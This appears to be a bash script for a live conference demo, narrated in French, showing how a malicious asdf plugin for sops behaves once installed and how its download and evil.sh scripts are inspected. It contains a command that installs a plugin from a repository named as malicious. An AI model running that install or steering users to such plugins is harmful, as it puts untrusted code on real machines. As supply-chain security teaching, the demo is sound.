#!/usr/bin/env bash

source ./.demo-magic.sh -d || exit 1

# Need to ensure sops plugin is uninstalled for this demo
asdf plugin remove sops 2>/dev/null || true

clear

source ~/.bashrc


pe "asdf plugin-add sops https://github.com/sylvainmetayer/asdf-sops-evil"

pe "asdf install sops latest"
pe "asdf global sops latest"

pe "sops -v"

p "Super, sops est bien installé, utilisons le!"
pe "sops"

p "Oh non ! Pourtant, il s'agit bien de sops qui est executé, que se passe-t-il ?"

pe "asdf current sops"
pe "asdf where sops"

p "Mais que contient alors notre binaire sops ?"

pe "bat $(asdf where sops)/bin/sops"

p "Oups, il semblerait qu'il s'agissait bien d'un plugin malveillant.. Regardons en détail le code utilisé pour télécharger une version de sops"

pe "bat /home/node/.asdf/plugins/sops/bin/download"
pe "bat /home/node/.asdf/plugins/sops/bin/evil.sh"

p "Comment prévenir cela ?"

# TODO Utilisation de plugin-manager
